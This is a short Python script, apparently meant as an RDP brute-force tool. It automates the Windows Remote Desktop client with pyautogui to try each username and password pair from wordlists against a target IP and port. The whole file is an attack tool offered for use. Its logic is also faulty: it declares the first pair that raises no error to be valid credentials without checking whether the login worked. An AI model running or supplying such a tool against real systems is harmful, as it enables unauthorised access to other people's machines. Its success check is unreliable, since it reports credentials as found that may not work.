import pyautogui
import sys
import os
import time

def rdp_bruteforce(target_ip, target_port, username_file, password_file):
    with open(username_file, 'r') as f:
        usernames = f.read().splitlines()

    with open(password_file, 'r') as f:
        passwords = f.read().splitlines()

    for username in usernames:
        for password in passwords:
            try:
                pyautogui.hotkey('win', 'r')
                time.sleep(1)
                pyautogui.typewrite(f"mstsc /v:{target_ip}:{target_port}")
                pyautogui.press('enter')
                time.sleep(1)
                pyautogui.typewrite(username)
                pyautogui.press('tab')
                pyautogui.typewrite(password)
                pyautogui.press('enter')
                time.sleep(1)
                pyautogui.hotkey('alt', 'f4')
                print(f"[+] Valid credentials found: {username}:{password}")
                return
            except pyautogui.FailSafeException:
                print(f"[-] Invalid credentials: {username}:{password}")
            except Exception as e:
                print(f"[-] An error occurred: {str(e)}")
                return

    print("[-] No valid credentials found.")

if __name__ == '__main__':
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))
    username_file = input("Enter the path to the username wordlist: ")
    password_file = input("Enter the path to the password wordlist: ")

    if not os.path.isfile(username_file) or not os.path.isfile(password_file):
        print("[-] Username or password wordlist file not found.")
        sys.exit(1)

    rdp_bruteforce(target_ip, target_port, username_file, password_file)